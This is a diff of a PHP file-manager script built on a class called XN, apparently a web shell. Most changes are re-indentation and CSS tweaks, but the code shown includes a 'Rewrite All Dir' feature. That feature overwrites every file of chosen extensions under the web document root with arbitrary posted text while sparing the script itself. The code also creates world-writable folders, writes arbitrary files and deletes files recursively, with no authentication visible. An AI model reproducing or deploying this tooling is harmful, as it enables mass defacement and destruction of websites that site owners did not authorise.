@@ -125,18 +125,18 @@ class XN {
             } return $result;
         }
     public static function addFile($filename, $data) {
-    	foreach ($filename as $value) {
-    		$handle = fopen($value, "w");
-    		if (fwrite($handle, $data)) {
-    			print("success");
+        foreach ($filename as $value) {
+            $handle = fopen($value, "w");
+            if (fwrite($handle, $data)) {
+                print("success");
             } else {
-            	print("failed");
+                print("failed");
             }
         }
     }
     public static function addfolder($path, $mode = 0777) {
-    	return (!is_dir($path) && (!mkdir($path, $mode)));
-  	}
+        return (!is_dir($path) && (!mkdir($path, $mode)));
+    }
     public static function delete($filename) {
         if (is_dir($filename)) {
             $scandir = scandir($filename);
@@ -205,45 +205,45 @@ class XN {
         }
     }
     public static function listFile($dir, &$output = array()) {
-    	foreach (scandir($dir) as $key => $value) {
-			$location = $dir.DIRECTORY_SEPARATOR.$value;
-			if (!is_dir($location)) {
-				$output[] = $location;
-			} elseif ($value != "." && $value != '..') {
-				self::listFile($location, $output);
-				$output[] = $location;
-			}
-		} return $output;
-	}
-	public static function rewrite($dir, $extension, $text) {
-		if (is_writable($dir)) {
-			foreach (self::listFile($dir) as $key => $value) {
-				switch (self::getext($value)) {
-					case $extension:
-						if (preg_match('/'.basename($value)."$/i", $_SERVER['PHP_SELF'], $matches) == 0) {
-							if (file_put_contents($value, $text)) {
-								?>
-								<div class="rewrite-success">
-									<?= $value ?>
-									<span>Success</span>
-								</div>
-								<?php
-							} else {
-								if (is_readable($value)) {
-								?>
-								<div class="rewrite-failed">
-									<?= $value ?>
-									<span>Failed</span>
-								</div>
-								<?php
-							}
-						}
-					}
-					break;
-				}
-			}
-		}
-	}
+        foreach (scandir($dir) as $key => $value) {
+            $location = $dir.DIRECTORY_SEPARATOR.$value;
+            if (!is_dir($location)) {
+                $output[] = $location;
+            } elseif ($value != "." && $value != '..') {
+                self::listFile($location, $output);
+                $output[] = $location;
+            }
+        } return $output;
+    }
+    public static function rewrite($dir, $extension, $text) {
+        if (is_writable($dir)) {
+            foreach (self::listFile($dir) as $key => $value) {
+                switch (self::getext($value)) {
+                    case $extension:
+                        if (preg_match('/'.basename($value)."$/i", $_SERVER['PHP_SELF'], $matches) == 0) {
+                            if (file_put_contents($value, $text)) {
+                                ?>
+                                <div class="rewrite-success">
+                                    <?= $value ?>
+                                    <span>Success</span>
+                                </div>
+                                <?php
+                            } else {
+                                if (is_readable($value)) {
+                                ?>
+                                <div class="rewrite-failed">
+                                    <?= $value ?>
+                                    <span>Failed</span>
+                                </div>
+                                <?php
+                            }
+                        }
+                    }
+                    break;
+                }
+            }
+        }
+    }
     public static function formatSize( $bytes ){
         $types = array( 'Byte', 'KB', 'MB', 'GB', 'TB' );
         for( $i = 0; $bytes >= 1024 && $i < ( count( $types ) -1 ); $bytes /= 1024, $i++ );
@@ -288,9 +288,9 @@ function head($x, $y, $class = null) {
         <a href="?x=<?= $y ?>">
             <i class="fa fa-arrow-left" aria-hidden="true"></i>
         </a>
-        <span>
+        <div class="dirname">
             <?= $x ?>
-        </span>
+        </div>
         <button class="dropdown-toggle toggle" title="Menu">
             <i class="fa fa-ellipsis-h" aria-hidden="true"></i>
         </button>
@@ -413,17 +413,17 @@ function alert($message) {
         font-family: 'Open Sans', sans-serif;
     }
     .count {
-    	z-index: 99999;
-    	text-align: center;
+        z-index: 99999;
+        text-align: center;
         padding:10px;
         padding-left:15px;
     }
     .count span {
-    	font-family: 'Open Sans', sans-serif;
-    	
+        font-family: 'Open Sans', sans-serif;
+        
     }
     .count select {
-    	padding:7px;
+        padding:7px;
         width:100%;
         border-radius: 5px;
         border: 1px solid #ebebeb;
@@ -431,19 +431,19 @@ function alert($message) {
         outline: none;
     }
     .all {
-    	display: inline-block;
-    	width:150px;
-    	text-align: left;
+        display: inline-block;
+        width:150px;
+        text-align: left;
     }
-	.select {
-		width:270px;
-		display: inline-block;
-	}
-	.total {
-		width:150px;
-		text-align: right;
-		display: inline-block;
-	}
+    .select {
+        width:270px;
+        display: inline-block;
+    }
+    .total {
+        width:150px;
+        text-align: right;
+        display: inline-block;
+    }
     .back .mobile {
         padding-left:25px;
         width:98%;
@@ -486,16 +486,26 @@ function alert($message) {
         display: none;
     }
     .back button {
-        margin-top:-5px;
-        font-size: 23px;
         background: none;
+        font-size: 23px;
         border: none;
+        margin-top:-10px;
         outline: none;
         float: right;
     }
-    .back span {
+    .back button:hover {
+        cursor: pointer;
+    }
+    .back .dirname {
+        position: absolute;
+        margin-top:-7px;
+        max-width:530px;
+        display: inline-block;
         margin-left: 20px;
         font-size: 23px;
+        overflow: hidden;
+        white-space: nowrap;
+        text-overflow: ellipsis;
     }
     .back a {
         background: #fff;
@@ -516,35 +526,36 @@ function alert($message) {
         width:50%;
     }
     .table {
+        overflow-y: auto;
         padding-left:20px;
         padding-right: 20px;
-        overflow: auto;
+        overflow-x: hidden;
         height:410px;
 
     }
     .rewrite-success {
-    	background: #6dc900;
-    	padding:5px;
-    	color: #fff;
-    	border-radius: 7px;
-    	margin-bottom:5px;
+        background: #6dc900;
+        padding:5px;
+        color: #fff;
+        border-radius: 7px;
+        margin-bottom:5px;
     }
     .rewrite-failed {
-    	background: #c90606;
-    	padding:5px;
-    	color: #fff;
-    	border-radius: 7px;
-    	margin-bottom:5px;
+        background: #c90606;
+        padding:5px;
+        color: #fff;
+        border-radius: 7px;
+        margin-bottom:5px;
     }
     .rewrite-success span {
-    	float: right;
+        float: right;
     }
     .rewrite-failed span {
-    	float: right;
+        float: right;
     }
     .rewrite {
-    	height:555px;
-    	overflow: auto;
+        height:555px;
+        overflow: auto;
     }
     .rewrite,
     .addfile,
@@ -640,6 +651,10 @@ function alert($message) {
     }
     .block .name {
         display: inline-block;
+        max-width:525px;
+        overflow: hidden;
+        white-space: nowrap;
+        text-overflow: ellipsis;
     }
     .block .date {
         margin-top: 4px;
@@ -695,7 +710,7 @@ function alert($message) {
     }
     ul.dropdown {
         display: none;
-        position: absolute;
+        position:absolute; ;
         z-index: 5;
         margin-top: .5em;
         background: #fff;
@@ -839,6 +854,7 @@ function alert($message) {
             width:98%;
         }
         .files {
+            border-radius:0;
             width:100%;
             height:620px;
         }
@@ -867,6 +883,24 @@ function alert($message) {
         }
         .group {
             display: none;
+        }
+        .block .name {
+            max-width:200px;
+            overflow: hidden;
+            white-space: nowrap;
+            text-overflow: ellipsis;
+        }
+        .back .dirname {
+            max-width:225px;
+            overflow: hidden;
+            white-space: nowrap;
+            text-overflow: ellipsis;
+        }
+        ul.dropdown-tool {
+            background: #fff;
+            margin-left:115px;
+            margin-top: 8px;
+            min-width: 10em;
         }
     }
 </style>
@@ -1016,90 +1050,90 @@ function filterTable() {
             break;
         case 'rewrite':
         head('Rewrite All Dir', getcwd(), 'hidden');
-        	?>
-        	<div class="rewrite">
-        		<table>
-        			<form method="post">
-        				<tr>
-        					<td>
-        						<input type="text" name="dir" value="<?= $_SERVER['DOCUMENT_ROOT'] ?>">
-        					</td>
-        				</tr>
-        				<tr>
-							<td>
-								<input type="text" name="ext[]" placeholder="ext: php html txt">
-							</td>
-						</tr>
-						<tr>
-							<td>
-								<textarea name="text"></textarea>
-							</td>
-						</tr>
-						<tr>
-							<td>
-								<input type="submit" name="rewrite" value="Start">
-								<input type="hidden" name="action" value="rewrite">
-							</td>
-						</tr>
-        			</form>
-        		</table>
-        		<?php
-        		if (isset($_POST['rewrite'])) {
-        			for ($i=0; $i < count($_POST['ext']) ; $i++) { 
-					$plod = explode(" ", $_POST['ext'][$i]);
-					foreach ($plod as $data) {
-						if ($data) { ?>
-							<tr>
-								<td>
-									<b><?= $data ?></b>
-								</td>
-							</tr>
-							<?php XN::rewrite($_POST['dir'], $data, $_POST['text']);
-							}
-						}
-					}
-				}
-				?>
-				</div>
-				<?php
-        	exit();
-        	break;
+            ?>
+            <div class="rewrite">
+                <table>
+                    <form method="post">
+                        <tr>
+                            <td>
+                                <input type="text" name="dir" value="<?= $_SERVER['DOCUMENT_ROOT'] ?>">
+                            </td>
+                        </tr>
+                        <tr>
+                            <td>
+                                <input type="text" name="ext[]" placeholder="ext: php html txt">
+                            </td>
+                        </tr>
+                        <tr>
+                            <td>
+                                <textarea name="text"></textarea>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td>
+                                <input type="submit" name="rewrite" value="Start">
+                                <input type="hidden" name="action" value="rewrite">
+                            </td>
+                        </tr>
+                    </form>
+                </table>
+                <?php
+                if (isset($_POST['rewrite'])) {
+                    for ($i=0; $i < count($_POST['ext']) ; $i++) { 
+                    $plod = explode(" ", $_POST['ext'][$i]);
+                    foreach ($plod as $data) {
+                        if ($data) { ?>
+                            <tr>
+                                <td>
+                                    <b><?= $data ?></b>
+                                </td>
+                            </tr>
+                            <?php XN::rewrite($_POST['dir'], $data, $_POST['text']);
+                            }
+                        }
+                    }
+                }
+                ?>
+                </div>
+                <?php
+            exit();
+            break;
         case 'adddir':
-        	if (isset($_POST['adddir'])) {
-        		$dirname = $_POST['dirname'];
-        		for ($i=0; $i < count($dirname) ; $i++) { 
-        			$explode = explode(' ', $dirname[$i]);
-        			foreach ($explode as $value) {
-        				if (XN::addfolder($value)) {
-        					alert('failed');
-        				} else {
-        					alert("success");
-        				}
-        			}
-        		}
-        	}
-        	head('Add Folder', getcwd(), 'hidden');
-        	?>
-        	<div class="adddir">
-        		<table>
-        			<form method="post">
-        				<tr>
-        					<td>
-        						<input type="text" name="dirname[]" placeholder="dirname">
-        					</td>
-        				</tr>
-        				<tr>
-        					<td>
-        						<input type="submit" name="adddir">
-        						<input type="hidden" name="action" value="adddir">
-        					</td>
-        				</tr>
-        			</form>
-        		</table>
-        	</div>
-        	<?php
-        	exit();
-        	break;
+            if (isset($_POST['adddir'])) {
+                $dirname = $_POST['dirname'];
+                for ($i=0; $i < count($dirname) ; $i++) { 
+                    $explode = explode(' ', $dirname[$i]);
+                    foreach ($explode as $value) {
+                        if (XN::addfolder($value)) {
+                            alert('failed');
+                        } else {
+                            alert("success");
+                        }
+                    }
+                }
+            }
+            head('Add Folder', getcwd(), 'hidden');
+            ?>
+            <div class="adddir">
+                <table>
+                    <form method="post">
+                        <tr>
+                            <td>
+                                <input type="text" name="dirname[]" placeholder="dirname">
+                            </td>
+                        </tr>
+                        <tr>
+                            <td>
+                                <input type="submit" name="adddir">
+                                <input type="hidden" name="action" value="adddir">
+                            </td>
+                        </tr>
+                    </form>
+                </table>
+            </div>
+            <?php
+            exit();
+            break;
         case 'addfile':
             if (isset($_POST['addfile'])) {
                 XN::addfile($_POST['filename'], $_POST['data']);
@@ -1411,7 +1445,7 @@ function filterTable() {
                                 <img src="https://image.flaticon.com/icons/svg/833/833524.svg">
                             </div>
                             <div class="name">
-                                <?= XN::sortname($file['names'], '1') ?>
+                                <?= $file['names'] ?>
                                 <div class="date">
                                     <div class="file-size">
                                         <?= $file['size'] ?>
@@ -1519,23 +1553,23 @@ function filterTable() {
     </table>
     </div>
     <form method="post" action="?x=<?= getcwd() ?>">
-    	<div class="count">
-    		<div class="all">
-    			<input type="checkbox"> Select All
-    		</div>
-    		<div class="select">
-    			<select name="" onchange='if(this.value != 0) { this.form.submit(); }'>
-    				<option disabled selected>Action</option>
-    				<option>Delete</option>
-    				<option>Backup</option>
-    			</select>
-    		</div>
-    		<div class="total">
-    			<span>
-        			Total Files : <?= XN::countAllFiles(getcwd()) ?>
-        		</span>
-    		</div>
-    	</div>
-	</form>
+        <div class="count">
+            <div class="all">
+                <input type="checkbox"> Select All
+            </div>
+            <div class="select">
+                <select name="" onchange='if(this.value != 0) { this.form.submit(); }'>
+                    <option disabled selected>Action</option>
+                    <option>Delete</option>
+                    <option>Backup</option>
+                </select>
+            </div>
+            <div class="total">
+                <span>
+                    Total Files : <?= XN::countAllFiles(getcwd()) ?>
+                </span>
+            </div>
+        </div>
+    </form>
 </div>
 </center>
